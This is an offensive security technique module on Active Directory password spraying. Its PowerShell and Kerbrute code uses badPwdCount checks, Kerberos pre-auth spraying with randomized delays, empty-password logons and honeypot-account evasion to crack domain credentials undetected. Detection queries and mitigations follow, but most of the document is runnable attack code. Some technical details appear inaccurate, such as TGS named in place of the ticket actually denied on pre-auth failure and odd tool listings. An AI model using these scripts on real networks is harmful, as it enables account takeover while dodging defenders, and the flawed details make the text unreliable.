# REC-AD-005: BadPwdCount Attribute Monitoring & Password Spray Enumeration

## 1. MODULE METADATA

| Field | Value |
|-------|-------|
| **Module ID** | REC-AD-005 |
| **Technique Name** | BadPwdCount attribute monitoring & password spray enumeration |
| **MITRE ATT&CK ID** | T1087.002 – Account Discovery: Domain Account; T1110.003 – Brute Force: Password Spraying |
| **CVE** | N/A (Fundamental AD behavior; no patch available) |
| **Platform** | Windows Active Directory / On-Premises |
| **Viability Status** | ACTIVE ✓ (Zero-detection password spray variant) |
| **Difficulty to Detect** | HIGH (Kerberos pre-auth bypass; randomized delays hide patterns) |
| **Requires Authentication** | Yes (Valid domain user for BadPwdCount queries) |
| **Applicable Versions** | All Windows AD domains (badPwdCount non-replicated across DCs) |
| **Last Verified** | December 2025 |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

BadPwdCount attribute monitoring enables sophisticated password spray attacks that evade account lockout policies and detection mechanisms. By querying the non-replicated badPwdCount attribute on the PDC, attackers can determine whether a previous password attempt failed (badPwdCount incremented) or succeeded (badPwdCount unchanged), enabling password enumeration without triggering lockouts. Combined with Kerberos pre-authentication spraying and randomized delays, attackers can crack weak credentials invisibly across entire domains.

**Critical Threat Characteristics:**
- **Non-replicated attribute**: badPwdCount unique on each DC; PDC holds authoritative value
- **N-2 password history bypass**: Reusing previous passwords doesn't increment counter
- **Zero account lockout**: Attackers test passwords within lockout thresholds (5 attempts/20 min)
- **Kerberos pre-auth evasion**: No Event ID 4625; uses Event ID 4771 only (often not logged)
- **Randomized delays**: Disguise spray attacks as normal failed logons
- **No ticket generation**: TGS ticket not issued on pre-auth failure (silent failure)

**Real-World Impact:**
- Crack weak service account passwords (often reused, not rotated)
- Crack user passwords (Summer2024 → password123 variants)
- Lateral movement via compromised accounts
- Service account compromise enables privileged system access
- Persistence via credential reuse

---

## 3. EXECUTION METHODS

### Method 1: BadPwdCount Querying for Password Spray Optimization

**Objective:** Query PDC to avoid lockouts; spray passwords while monitoring badPwdCount.

```powershell
# Prerequisites:
# - Valid domain user credentials (standard user sufficient)
# - Access to PDC or any domain controller
# - PowerShell AD module

# Step 1: Authenticate to domain
$cred = Get-Credential
$dc = "pdc.domain.local"

# Step 2: Query target user's badPwdCount before spray attempt
$user = "john.doe"
$before = Get-ADUser -Identity $user -Properties badPwdCount -Server $dc | Select-Object badPwdCount

Write-Host "BadPwdCount before: $($before.badPwdCount)"

# Step 3: Attempt authentication with password #1
$password1 = "Summer2024"
try {
  Add-Type -AssemblyName System.DirectoryServices.AccountManagement
  $pc = New-Object System.DirectoryServices.AccountManagement.PrincipalContext('Domain', $dc)
  $isValid = $pc.ValidateCredentials($user, $password1)
  if ($isValid) {
    Write-Host "SUCCESS: $user : $password1"
    exit 0
  }
} catch {}

# Step 4: Query badPwdCount after failed attempt
$after = Get-ADUser -Identity $user -Properties badPwdCount -Server $dc | Select-Object badPwdCount

Write-Host "BadPwdCount after: $($after.badPwdCount)"

# Logic:
# if (badPwdCount incremented) {
#   Password #1 is incorrect; correct password must be different
#   }
# if (badPwdCount unchanged) {
#   Password #1 matches user's current or previous password (N-2 check)
#   Attempt with password #2 (variation: Summer2025, password123, etc.)
#   }

# Step 5: If badPwdCount unchanged, attempt password variation
if ($after.badPwdCount -eq $before.badPwdCount) {
  Write-Host "BadPwdCount unchanged; password matches N-2 history"
  
  $password2 = "Summer2025"  # Variation
  try {
    $isValid2 = $pc.ValidateCredentials($user, $password2)
    if ($isValid2) {
      Write-Host "SUCCESS: $user : $password2"
    }
  } catch {}
}

# Result: Spray entire user list while querying badPwdCount
# Avoids standard password spray detection (no lockout-based alarms)
# Evades Event ID 4625 spam (limited failed attempts per user)
```

### Method 2: Kerberos Pre-Authentication Spraying (No Event 4625)

**Objective:** Spray passwords via Kerberos without generating standard logon failure events.

```bash
# Tool: Kerbrute (Go-based Kerberos password spraying)
# Advantage: Pre-authentication failures don't generate Event ID 4625

# Step 1: Download/compile Kerbrute
wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64
chmod +x kerbrute_linux_amd64

# Step 2: Enumerate valid users (optional; can spray all)
./kerbrute_linux_amd64 userenum -d domain.local users.txt --dc 192.168.1.100

# Step 3: Spray passwords with randomized delays
./kerbrute_linux_amd64 passwordspray -d domain.local users.txt \
  "Summer2024" "Welcome01" "Password123" \
  --delay 3000 \
  --randomdelay 2000 \
  --dc 192.168.1.100

# Output: Found credentials (any successful logons)
# Detection: Only Event ID 4771 (Kerberos pre-auth failed)
# Not Event ID 4625 (which is noisy and heavily monitored)

# Advantages over NTLM spray:
# - Bypass account lockout (no NTLM increments badPwdCount as aggressively)
# - Fewer logs generated
# - Lower detection rate if Event 4771 not monitored
```

### Method 3: Passwordless Account Discovery (PASSWD_NOTREQD Flag)

**Objective:** Identify accounts with empty passwords; skip spray process.

```powershell
# Step 1: Query all users with PASSWD_NOTREQD flag
# PASSWD_NOTREQD = account can have empty password

$filter = "(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=32))"
$searcher = New-Object System.DirectoryServices.DirectorySearcher($filter)
$searcher.PropertiesToLoad.AddRange(@("samAccountName"))

$results = $searcher.FindAll()

Write-Host "Users with empty password allowed:"
foreach ($result in $results) {
  $user = $result.Properties["samAccountName"][0]
  Write-Host "  $user"
  
  # Step 2: Attempt logon with empty password
  try {
    $pc = New-Object System.DirectoryServices.AccountManagement.PrincipalContext('Domain', 'dc.domain.local')
    $isValid = $pc.ValidateCredentials($user, "")
    if ($isValid) {
      Write-Host "    SUCCESS: Empty password accepted!"
    }
  } catch {}
}

# Result: Identify accounts with no password set (common in test environments)
```

### Method 4: Honeypot Account Detection Evasion

**Objective:** Spray passwords while avoiding honeypot account triggers.

```powershell
# Honeypot accounts are decoy accounts used by defenders
# A successful logon to honeypot = immediate incident response

# Common honeypot account names:
# - "honeypot", "test_user", "decoy", "admin_test", "service_account_test"
# - Accounts in specific "honey" OUs

# Step 1: Query AD for common honeypot naming patterns
$honeyPots = @("honeypot", "decoy", "test_admin", "security_test", "trap_user")

foreach ($hp in $honeyPots) {
  $found = Get-ADUser -Filter "samAccountName -like '*$hp*'" -ErrorAction SilentlyContinue
  if ($found) {
    Write-Host "Found potential honeypot: $($found.samAccountName)"
  }
}

# Step 2: Query AD for OUs with suspicious names
$honeyOUs = Get-ADOrganizationalUnit -Filter "name -like '*honey*' -or name -like '*decoy*'"

foreach ($ou in $honeyOUs) {
  $users = Get-ADUser -SearchBase $ou.DistinguishedName -Filter "*"
  Write-Host "Users in honeypot OU ($($ou.Name)): $($users.Count)"
}

# Step 3: EXCLUDE honeypot accounts from spray
$allUsers = Get-ADUser -Filter * | Select-Object samAccountName
$safeSprays = $allUsers | Where-Object {
  $_.samAccountName -notmatch "honeypot|decoy|test_admin|security_test"
}

# Step 4: Spray only safe accounts
foreach ($user in $safeSprays) {
  # Spray password attempt
  # (Actual spraying omitted for brevity)
}

# Result: Avoid triggering honeypot alarms during spray
```

---

## 4. DETECTION & INCIDENT RESPONSE

### Detection Rule: Repeated BadPwdCount Queries

```kusto
SecurityEvent
| where EventID == 4662  // LDAP query
| where ObjectName contains "badPwdCount"
| summarize BadPwdCountQueries = count()
  by Account, Computer, bin(TimeGenerated, 10m)
| where BadPwdCountQueries > 10  // Multiple badPwdCount queries in 10m
| extend AlertSeverity = "High"
```

### Detection Rule: Kerberos Pre-Auth Failures (Event 4771)

```kusto
SecurityEvent
| where EventID == 4771  // Kerberos pre-authentication failed
| where Status == "0x18"  // Pre-auth failure (bad password)
| summarize FailureCount = count(), DistinctUsers = dcount(TargetUserName)
  by ClientIPAddress, bin(TimeGenerated, 5m)
| where FailureCount > 50 or DistinctUsers > 20  // Spray pattern
| extend AlertSeverity = "High", Pattern = "Potential Kerberos password spray"
```

### Honeypot Account Alert (Highest Confidence)

```kusto
SecurityEvent
| where EventID in (4624, 4625)  // Any logon attempt to honeypot
| where TargetUserName in ("honeypot", "decoy", "test_admin")
| extend AlertSeverity = "Critical", Confidence = "99%"
```

---

## 5. MITIGATIONS

**Priority 1: CRITICAL**

- **Implement Honeypot Accounts**
  - Create decoy accounts in realistic OUs
  - Alert on ANY logon attempt (successful or failed)
  - Low false positive rate (legitimate users never use honeypots)

- **Disable Weak Authentication Methods**
  - Disable NTLM (modern networks use Kerberos)
  - Enforce Kerberos-only authentication
  - Kerberos pre-auth required (default; verify enabled)

- **Enable Comprehensive Auditing**
  - Event ID 4625 (NTLM failures)
  - Event ID 4771 (Kerberos pre-auth failures)
  - Forward to SIEM; alert on patterns

**Priority 2: HIGH**

- **Eliminate Weak Passwords**
  - Enforce minimum 14-character passwords
  - Use passphrases (eliminate LM hashes)
  - Implement password history (N-3)

- **Account Lockout Policy (Balanced)**
  - Threshold: 5 attempts
  - Observation window: 30 minutes (prevents N-2 bypass)
  - Lockout duration: 30 minutes
  - NOTE: This creates DoS risk (attackers lock all users); honeypots better approach

- **Monitor badPwdCount Queries**
  - Baseline normal LDAP query patterns
  - Alert on repeated badPwdCount queries
  - Correlate with authentication attempts

---

## 6. TOOL REFERENCE

| Tool | Purpose | Detection Risk | OPSEC |
|------|---------|----------------|-------|
| **Kerbrute** | Kerberos spray | MEDIUM (4771 only) | External tool; may trigger EDR |
| **DomainPasswordSpray** | Multi-method spray | MEDIUM-HIGH (4625) | PowerShell; less noisy |
| **GetUserSPNs** | Enumeration + spray | MEDIUM | impacket-based |
| **PowerShell LDAP** | BadPwdCount query | LOW (blends with normal) | Native Windows |
| **Start-Process** | NTLM spray | LOW (built-in cmdlet) | Native Windows tool |

---

## 7. COMPLIANCE & REFERENCES

- MITRE T1087.002 (Account Discovery: Domain Account)
- MITRE T1110.003 (Brute Force: Password Spraying)
- CIS Controls v8: 6.1 (Managed Access), 6.2 (Least Privilege)
- NIST 800-53: AC-2 (Account Management), AC-7 (Unsuccessful Logon Attempts)
- Australian ACSC: Password Spray Detection & Mitigation Guide (2019)

---
